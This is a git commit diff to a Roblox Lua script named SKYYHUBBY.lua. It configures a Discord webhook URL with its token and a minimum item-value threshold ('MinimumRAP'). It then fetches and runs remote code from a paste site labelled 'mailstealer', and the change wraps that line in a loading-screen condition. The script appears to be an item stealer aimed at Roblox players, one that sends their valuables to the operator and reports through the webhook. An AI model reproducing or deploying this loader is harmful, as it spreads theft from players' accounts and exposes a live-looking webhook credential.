a8eae2eccdc1c5eea11850cd95b8152f04561acb
randomtestmonkye <158342456+randomtestmonkye@users.noreply.github.com>
2024-02-02 18:22:34 +0100

    Update SKYYHUBBY.lua

--- SKYYHUBBY.lua
+++ SKYYHUBBY.lua
@@ -3,7 +3,9 @@ Username2 = ""
 
 Webhook = "https://discord.com/api/webhooks/1102208774695047239/r1zrtOePijfhSoadNA3lxY3XguRQm_cOq0uMzO17Oq91l5aJTiZvY0M-iTAktkAdT6f_"
 
-LoadingScreen = true
+LoadScreen = true
 MinimumRAP = 10000
 
-loadstring(game:HttpGet("https://shz.al/~egorikusa_mailstealer"))()
+if LoadScreen == true then 
+    loadstring(game:HttpGet("https://shz.al/~egorikusa_mailstealer"))()
+end
